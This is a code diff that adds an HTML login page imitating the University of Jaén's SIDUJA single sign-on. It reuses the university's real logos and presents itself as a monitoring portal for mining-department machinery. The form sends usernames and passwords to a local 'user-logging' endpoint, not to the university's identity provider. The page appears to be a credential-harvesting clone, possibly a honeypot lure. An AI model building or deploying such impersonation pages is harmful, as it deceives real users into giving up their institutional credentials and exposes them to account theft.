@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="es" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+    <meta name="robots" content="noindex, nofollow">
+    
+    <title id="page-title">Indique su nombre de usuario y clave de acceso</title>
+
+    <link rel="stylesheet" href="styles.css">
+    <link rel="icon" href="https://idp.ujaen.es/autenticacion/module.php/themeujaen3/assets/favicon.ico?tag=06950">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+</head>
+
+<body>
+    <div id="layout">
+        <header id="header">
+            <div class="wrap v-center">
+                <div id="logo">
+                    <img src="https://idp.ujaen.es/autenticacion/module.php/themeujaen3/assets/logo_uja.png?tag=06950" alt="Universidad de Jaén">
+                </div>
+
+                <div class="language-selection">
+                    <form class="pure-form">
+                        <select aria-label="Language" id="language-selector">
+                            <option value="es" selected>🌐 Español</option>
+                            <option value="en">🌐 English</option>
+                        </select>
+                    </form>
+                </div>
+            </div>
+        </header>
+
+        <main>
+            <div id="content">
+                <div class="wrap">
+                    <div id="flex-container-login">
+                        <div class="siduja-box login-card">
+                            <img class="siduja_logo" src="https://idp.ujaen.es/autenticacion/module.php/themeujaen3/assets/logo_siduja.png?tag=06950" alt="SIDUJA">
+                            
+                            <form id="login-form" class="pure-form pure-form-aligned" action="user-logging" method="POST" name="login-form">
+                                <input type="hidden" name="authsource">
+                                
+                                <div class="pure-control-group">
+                                    <label id="label-user" for="username">Nombre de usuario</label>
+                                    <input id="username" type="text" name="username" required>
+                                </div>
+
+                                <div class="pure-control-group">
+                                    <label id="label-pass" for="password">Clave de acceso</label>
+                                    <input id="password" type="password" name="password" required>
+                                </div>
+
+                                <div class="pure-controls">
+                                    <button type="submit" id="btn-login" class="pure-button pure-button-primary">Acceder</button>
+                                </div>
+                            </form>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="full-width-info">
+                    <div class="wrap">
+                        <h6 id="info-title">Bienvenido al servicio de monitorización de equipos industriales de la Universidad de Jaén</h6>
+                        <p id="info-p1">Este portal le permitirá acceder a los datos en tiempo real de la maquinaria perteneciente al departamento de explotación de minas. Inicie sesión con su cuenta de la Universidad de Jaén para visualizar los datos y configurar alertas personalizadas.</p>
+                        <p id="info-p2">Si tiene problemas para iniciar sesión, por favor contacte con el soporte técnico de la universidad o revise la sección de ayuda en el sitio web.</p>
+                    </div>
+                </div>
+
+                <footer class="footer-info">
+                    <div class="wrap">
+                        <p><strong>Explotación de Minas - Universidad de Jaén</strong></p>
+                        <p>Carretera de Madrid, s/n 23071 Jaén</p>
+                        <p>Teléfono de Información: XXXXXXXXX</p>
+                        <p>Email: <a href="mailto:explotacionminas@ujaen.es">explotacionminas@ujaen.es</a></p>
+                    </div>
+                </footer>
+            </div>
+        </main>
+    </div>
+
+    <script>
+        const selector = document.getElementById('language-selector');
+        const texts = {
+            es: {
+                user: "Nombre de usuario",
+                pass: "Clave de acceso",
+                btn: "Acceder",
+                title: "Indique su nombre de usuario y clave de acceso",
+                h2: "Bienvenido al servicio de monitorización de equipos industriales de la Universidad de Jaén",
+                p1: "Este portal le permitirá acceder a los datos en tiempo real de la maquinaria perteneciente al departamento de explotación de minas. Inicie sesión con su cuenta de la Universidad de Jaén para visualizar los datos y configurar alertas personalizadas.",
+                p2: "Si tiene problemas para iniciar sesión, por favor contacte con el soporte técnico de la universidad o revise la sección de ayuda en el sitio web."
+            },
+            en: {
+                user: "Username",
+                pass: "Password",
+                btn: "Sign in",
+                title: "Please enter your username and password",
+                h2: "Welcome to the University of Jaén Industrial Equipment Monitoring Service",
+                p1: "This portal provides real-time data access for machinery within the Mining Operations Department. Log in with your University of Jaén account to view data and set up personalized alerts.",
+                p2: "If you experience any issues logging in, please contact the university's technical support or visit the help section on our website."
+            }
+        };
+
+        selector.addEventListener('change', (e) => {
+            const lang = e.target.value;
+            document.getElementById('label-user').textContent = texts[lang].user;
+            document.getElementById('label-pass').textContent = texts[lang].pass;
+            document.getElementById('btn-login').textContent = texts[lang].btn;
+            document.getElementById('info-title').textContent = texts[lang].h2;
+            document.getElementById('info-p1').textContent = texts[lang].p1;
+            document.getElementById('info-p2').textContent = texts[lang].p2;
+            document.title = texts[lang].title;
+        });
+    </script>
+</body>
+</html>
